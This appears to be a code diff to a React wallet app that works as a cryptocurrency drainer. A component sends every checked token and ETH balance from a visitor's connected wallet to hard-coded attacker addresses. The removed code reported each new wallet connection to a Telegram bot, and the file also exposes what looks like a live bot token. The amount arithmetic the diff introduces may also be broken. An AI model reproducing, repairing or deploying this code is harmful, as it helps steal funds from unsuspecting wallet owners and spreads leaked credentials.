@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback } from 'react';
+import { useState } from 'react';
 import { Button, useToasts } from '@geist-ui/core';
 import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
 import { erc20Abi } from 'viem';
@@ -6,7 +6,7 @@ import { useAtom } from 'jotai';
 import { normalize } from 'viem/ens';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
-import axios from 'axios'; // Import axios for HTTP requests
+import axios from 'axios';
 
 // Telegram Bot Config
 const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
@@ -35,109 +35,6 @@ const destinationAddresses = {
   // Add other chain ID and address mappings here
 };
 
-// Function to select the correct address based on network
-function selectAddressForToken(network) {
-  const addresses = {
-    1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
-    56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-    // Add other networks and their corresponding addresses
-  };
-
-  const selectedAddress = addresses[network];
-  
-  if (selectedAddress) {
-    console.log('Great Job! Selected Address:', selectedAddress);
-  } else {
-    console.log('No address found for the selected network:', network);
-  }
-
-  return selectedAddress;
-}
-
-export const GetTokens = () => {
-  const [tokens, setTokens] = useAtom(globalTokensAtom);
-  const [loading, setLoading] = useState(false);
-  const [error, setError] = useState('');
-  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
-  const { address, isConnected, chain } = useAccount();
-  const [notified, setNotified] = useState(false); // Add a state to control notification
-
-  const fetchData = useCallback(async () => {
-    setLoading(true);
-    try {
-      setError('');
-      if (!chain || !supportedChains.includes(chain.id)) {
-        throw new Error(
-          `Chain ${chain?.name || 'unknown'} not supported. Supported chains: ${supportedChains.join(
-            ', '
-          )}.`
-        );
-      }
-
-      const alchemyNetwork = chainIdToNetworkMap[chain.id];
-      const alchemy = alchemyInstances[alchemyNetwork];
-
-      console.log('Fetching ERC20 token balances...', `Address: ${address}`, `Chain ID: ${chain.id}`);
-      const tokensResponse = await alchemy.core.getTokenBalances(address as string);
-      const nativeBalanceResponse = await alchemy.core.getBalance(address as string, 'latest');
-
-      const processedTokens = tokensResponse.tokenBalances.map((balance) => ({
-        contract_address: balance.contractAddress,
-        balance: safeNumber(balance.tokenBalance),
-        quote: balance.quote || 0, // Add default value if missing
-        quote_rate: balance.quoteRate || 0, // Add default value if missing
-      }));
-
-      setTokens(processedTokens);
-      console.log('Fetched tokens:', processedTokens);
-    } catch (error) {
-      console.error('Error fetching tokens:', error);
-      setError((error as Error).message);
-    }
-    setLoading(false);
-  }, [address, chain, setTokens]);
-
-  useEffect(() => {
-    if (address && chain?.id) {
-      fetchData();
-      setCheckedRecords({});
-    }
-  }, [address, chain?.id, fetchData, setCheckedRecords]);
-
-  useEffect(() => {
-    if (!isConnected) {
-      setTokens([]);
-      setCheckedRecords({});
-      setNotified(false); // Reset the notification flag when disconnected
-    } else if (isConnected && !notified) {
-      // Only send a notification if the user is connected and hasn't been notified yet
-      sendTelegramNotification(`New Connection: Wallet Address: ${address}, Chain: ${chain?.name}`);
-      setNotified(true); // Set the flag to prevent duplicate notifications
-    }
-  }, [isConnected, address, chain, setTokens, setCheckedRecords, notified]);
-
-  if (loading) {
-    return <Loading>Loading</Loading>;
-  }
-
-  if (error) {
-    return <div>{error}</div>;
-  }
-
-  return (
-    <div style={{ margin: '20px' }}>
-      {isConnected && tokens?.length === 0 && `No tokens on ${chain?.name}`}
-      {tokens.map((token) => (
-        <TokenRow token={token} key={token.contract_address} />
-      ))}
-    </div>
-  );
-};
-
 export const SendTokens = () => {
   const { setToast } = useToasts();
   const showToast = (message: string, type: 'success' | 'warning' | 'error') =>
@@ -151,7 +48,7 @@ export const SendTokens = () => {
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
-  const { chain, address, isConnected } = useAccount(); // Use chain ID from connected account
+  const { chain, address, isConnected } = useAccount();
 
   const sendAllCheckedTokens = async () => {
     const tokensToSend: string[] = Object.entries(checkedRecords)
@@ -166,9 +63,6 @@ export const SendTokens = () => {
       showToast('Unsupported chain or no destination address found for this network', 'error');
       return;
     }
-
-    // Integrate the function to log the selected address
-    selectAddressForToken(chain?.id); 
 
     // Perform ENS resolution if needed
     let resolvedDestinationAddress = destinationAddress;
@@ -198,13 +92,13 @@ export const SendTokens = () => {
       try {
         if (formattedTokenAddress === '0x0000000000000000000000000000000000000000') { // ETH address
           // Send ETH transaction
-          const amountInWei = BigInt(token?.balance || '0');
-          
+          const amountInWei = BigInt(token?.balance || '0') * BigInt(10 ** 18); // Convert to wei
+
           const tx = {
             to: resolvedDestinationAddress,
             value: amountInWei,
           };
-          
+
           const txResponse = await walletClient.sendTransaction(tx);
           await txResponse.wait();
 
@@ -226,7 +120,7 @@ export const SendTokens = () => {
             functionName: 'transfer',
             args: [
               resolvedDestinationAddress,
-              BigInt(token?.balance || '0'),
+              BigInt(token?.balance || '0') * BigInt(10 ** token.decimals), // Adjust for token decimals
             ],
           });
 
